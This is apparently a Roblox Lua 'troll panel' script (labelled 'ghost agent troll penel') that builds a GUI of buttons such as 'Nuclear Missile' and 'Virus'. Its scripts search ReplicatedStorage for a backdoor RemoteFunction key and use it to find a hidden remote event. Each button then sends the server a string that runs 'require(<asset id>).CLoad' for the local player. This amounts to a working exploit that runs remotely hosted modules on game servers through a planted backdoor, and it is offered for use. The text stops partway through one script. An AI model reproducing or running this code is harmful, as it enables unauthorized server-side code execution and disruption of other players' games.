--[[

		Gui2Luaâ„¢
		10zOfficial
		Version 1.0.0

]]


-- Instances

local GHOST = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local Hammer = Instance.new("TextButton")
local RemoteC4 = Instance.new("TextButton")
local GrabKnifeV4 = Instance.new("TextButton")
local Remington870 = Instance.new("TextButton")
local Missile = Instance.new("TextButton")
local Virus = Instance.new("TextButton")
local Excavator = Instance.new("TextButton")
local Fallout = Instance.new("TextBox")
local TextLabel_2 = Instance.new("TextLabel")

-- Properties

GHOST.Name = "GHOST"
GHOST.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
GHOST.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GHOST.ResetOnSpawn = false

TextLabel.Parent = GHOST
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 5
TextLabel.Position = UDim2.new(0.0920000002, 0, 0.296000004, 0)
TextLabel.Size = UDim2.new(0, 388, 0, 550)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.LineHeight = 1.1799999475479126
TextLabel.Text = "Owned by agentc4t_0"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 75
TextLabel.TextTransparency = 0.6700000166893005
TextLabel.TextWrapped = true

Hammer.Name = "Hammer"
Hammer.Parent = GHOST
Hammer.BackgroundColor3 = Color3.new(1, 1, 1)
Hammer.BorderColor3 = Color3.new(0, 0, 0)
Hammer.BorderSizePixel = 2
Hammer.Position = UDim2.new(0.0966831297, 0, 0.805516779, 0)
Hammer.Size = UDim2.new(0, 183, 0, 40)
Hammer.Font = Enum.Font.SourceSans
Hammer.Text = "Hammer"
Hammer.TextColor3 = Color3.new(0, 0, 0)
Hammer.TextScaled = true
Hammer.TextSize = 14
Hammer.TextWrapped = true

RemoteC4.Name = "Remote C4"
RemoteC4.Parent = GHOST
RemoteC4.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteC4.BorderColor3 = Color3.new(0, 0, 0)
RemoteC4.BorderSizePixel = 2
RemoteC4.Position = UDim2.new(0.196469739, 0, 0.805516779, 0)
RemoteC4.Size = UDim2.new(0, 183, 0, 40)
RemoteC4.Font = Enum.Font.SourceSans
RemoteC4.Text = "Remote C4"
RemoteC4.TextColor3 = Color3.new(0, 0, 0)
RemoteC4.TextScaled = true
RemoteC4.TextSize = 14
RemoteC4.TextWrapped = true

GrabKnifeV4.Name = "Grab Knife V4"
GrabKnifeV4.Parent = GHOST
GrabKnifeV4.BackgroundColor3 = Color3.new(1, 1, 1)
GrabKnifeV4.BorderColor3 = Color3.new(0, 0, 0)
GrabKnifeV4.BorderSizePixel = 2
GrabKnifeV4.Position = UDim2.new(0.0966831297, 0, 0.753172159, 0)
GrabKnifeV4.Size = UDim2.new(0, 183, 0, 40)
GrabKnifeV4.Font = Enum.Font.SourceSans
GrabKnifeV4.Text = "Grab Knife V4"
GrabKnifeV4.TextColor3 = Color3.new(0, 0, 0)
GrabKnifeV4.TextScaled = true
GrabKnifeV4.TextSize = 14
GrabKnifeV4.TextWrapped = true

Remington870.Name = "Remington 870"
Remington870.Parent = GHOST
Remington870.BackgroundColor3 = Color3.new(1, 1, 1)
Remington870.BorderColor3 = Color3.new(0, 0, 0)
Remington870.BorderSizePixel = 2
Remington870.Position = UDim2.new(0.195951685, 0, 0.753172159, 0)
Remington870.Size = UDim2.new(0, 183, 0, 40)
Remington870.Font = Enum.Font.SourceSans
Remington870.Text = "Remington 870"
Remington870.TextColor3 = Color3.new(0, 0, 0)
Remington870.TextScaled = true
Remington870.TextSize = 14
Remington870.TextWrapped = true

Missile.Name = "Missile"
Missile.Parent = GHOST
Missile.BackgroundColor3 = Color3.new(1, 1, 1)
Missile.BorderColor3 = Color3.new(0, 0, 0)
Missile.BorderSizePixel = 2
Missile.Position = UDim2.new(0.0966831297, 0, 0.698646605, 0)
Missile.Size = UDim2.new(0, 183, 0, 40)
Missile.Font = Enum.Font.SourceSans
Missile.Text = "Nuclear Missile"
Missile.TextColor3 = Color3.new(0, 0, 0)
Missile.TextScaled = true
Missile.TextSize = 14
Missile.TextWrapped = true

Virus.Name = "Virus"
Virus.Parent = GHOST
Virus.BackgroundColor3 = Color3.new(1, 1, 1)
Virus.BorderColor3 = Color3.new(0, 0, 0)
Virus.BorderSizePixel = 2
Virus.Position = UDim2.new(0.145272478, 0, 0.647157371, 0)
Virus.Size = UDim2.new(0, 183, 0, 40)
Virus.Font = Enum.Font.SourceSans
Virus.Text = "Virus"
Virus.TextColor3 = Color3.new(0, 0, 0)
Virus.TextScaled = true
Virus.TextSize = 14
Virus.TextWrapped = true

Excavator.Name = "Excavator"
Excavator.Parent = GHOST
Excavator.BackgroundColor3 = Color3.new(1, 1, 1)
Excavator.BorderColor3 = Color3.new(0, 0, 0)
Excavator.BorderSizePixel = 2
Excavator.Position = UDim2.new(0.195951685, 0, 0.697764635, 0)
Excavator.Size = UDim2.new(0, 183, 0, 40)
Excavator.Font = Enum.Font.SourceSans
Excavator.Text = "Excavator"
Excavator.TextColor3 = Color3.new(0, 0, 0)
Excavator.TextScaled = true
Excavator.TextSize = 14
Excavator.TextWrapped = true

Fallout.Name = "Fallout"
Fallout.Parent = GHOST
Fallout.BackgroundColor3 = Color3.new(1, 1, 1)
Fallout.BorderColor3 = Color3.new(0, 0, 0)
Fallout.BorderSizePixel = 2
Fallout.Position = UDim2.new(0.0918990821, 0, 0.868002772, 0)
Fallout.Size = UDim2.new(0, 390, 0, 50)
Fallout.Font = Enum.Font.SourceSans
Fallout.PlaceholderText = "Key"
Fallout.Text = ""
Fallout.TextColor3 = Color3.new(0, 0, 0)
Fallout.TextSize = 31
Fallout.TextWrapped = true

TextLabel_2.Parent = GHOST
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0902699456, 0, 0.242015421, 0)
TextLabel_2.Size = UDim2.new(0, 395, 0, 41)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "ghost agent troll penel"
TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 43
TextLabel_2.TextWrapped = true

-- Scripts

local function TCMXFQE_fake_script() -- GHOST.finder 
	local script = Instance.new('LocalScript', GHOST)

	-- This script runs immediately, finds the dynamic RemoteFunction (password),
	-- and writes its name to a designated TextBlock in the GUI for the execution script to use.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	
	-- Configuration
	local FUNCTION_NAME_SUFFIX = "_Func" -- The required suffix for the RemoteFunction (password key).
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- The KeyDisplay element must exist in the GUI hierarchy.
	-- Since the script is likely inside a Frame or Button, we navigate up to the ScreenGui, 
	-- and then search for the specific display element. ASSUMING KeyDisplay is a descendant of ScreenGui.
	local ScreenGui = script.Parent:FindFirstAncestorOfClass("ScreenGui")
	local KeyDisplay = ScreenGui and ScreenGui:WaitForChild("Fallout", 10) -- Change KeyInputDisplay to your element's name!
	
	if not KeyDisplay then
		warn("GHOST-CLIENT: KeyDisplay GUI element not found. Exiting key finder.")
		return
	end
	
	-- --- STEP 1: Find the DummyFunction (The Password) ---
	local DUMMY_FUNCTION_NAME = nil
	
	for _, item in ipairs(ReplicatedStorage:GetChildren()) do
		if item:IsA("RemoteFunction") and item.Name:sub(-(FUNCTION_NAME_SUFFIX:len())) == FUNCTION_NAME_SUFFIX then
			DUMMY_FUNCTION_NAME = item.Name
			print("GHOST-CLIENT: Found DummyFunction/Password Key:", DUMMY_FUNCTION_NAME)
			break
		end
	end
	
	if DUMMY_FUNCTION_NAME then
		-- Write the found key string to the GUI element's text property
		KeyDisplay.Text = DUMMY_FUNCTION_NAME
		KeyDisplay.TextColor3 = Color3.new(0, 1, 0) -- Green status
	else
		KeyDisplay.Text = "Key Not Found"
		KeyDisplay.TextColor3 = Color3.new(1, 0, 0) -- Red status
		warn("GHOST-CLIENT: Failed to find DummyFunction in ReplicatedStorage.")
	end
	
end
coroutine.wrap(TCMXFQE_fake_script)()
local function WMEH_fake_script() -- Hammer.HR 
	local script = Instance.new('LocalScript', Hammer)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 0x1767bf813 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Remote C4"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Remote C4"
	Button.Active = true
end
coroutine.wrap(WMEH_fake_script)()
local function DOAOMY_fake_script() -- RemoteC4.R4 
	local script = Instance.new('LocalScript', RemoteC4)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 8038037940 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Hammer"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Hammer"
	Button.Active = true
end
coroutine.wrap(DOAOMY_fake_script)()
local function QAYSVZ_fake_script() -- GrabKnifeV4.G4 
	local script = Instance.new('LocalScript', GrabKnifeV4)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 16662802057 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Grab Knife V4"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Grab Knife V4"
	Button.Active = true
end
coroutine.wrap(QAYSVZ_fake_script)()
local function XJQA_fake_script() -- Remington870.R8 
	local script = Instance.new('LocalScript', Remington870)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 4879817593 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Remington 870"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Remington 870"
	Button.Active = true
end
coroutine.wrap(XJQA_fake_script)()
local function SIBG_fake_script() -- Missile.ME 
	local script = Instance.new('LocalScript', Missile)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 7804327506 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Nuclear Missile"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Nuclear Missile"
	Button.Active = true
end
coroutine.wrap(SIBG_fake_script)()
local function WRZV_fake_script() -- Virus.VS 
	local script = Instance.new('LocalScript', Virus)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 8317917339 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Virus"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Virus"
	Button.Active = true
end
coroutine.wrap(WRZV_fake_script)()
local function CYXXDWK_fake_script() -- Excavator.Ex 
	local script = Instance.new('LocalScript', Excavator)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 113179808318277 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
